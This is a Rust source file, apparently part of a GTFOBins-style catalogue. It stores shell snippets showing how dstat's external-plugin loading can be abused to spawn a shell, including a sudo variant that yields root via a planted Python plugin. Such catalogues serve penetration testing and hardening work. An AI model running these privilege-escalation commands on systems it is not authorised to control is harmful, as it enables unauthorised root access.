
pub static BIN_NAME: &'static str = "dstat";
pub static BIN_DESC: &'static str = r#"`dstat` allows you to run arbitrary `python` scripts loaded as “external plugins” if they are located in one of the directories stated in the `dstat` man page under “FILES”:

    `~/.dstat/`
    `(path of binary)/plugins/`
    `/usr/share/dstat/`
    `/usr/local/share/dstat/`

Pick the one that you can write into."#;
pub static SH_CODE: &'static str = r#"
    
    mkdir -p ~/.dstat
    echo 'import os; os.execv("/bin/sh", ["sh"])' >~/.dstat/dstat_xxx.py
    dstat --xxx
"#;
pub static SUDO_CODE: &'static str = r#"
    
    echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
    sudo dstat --xxx
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
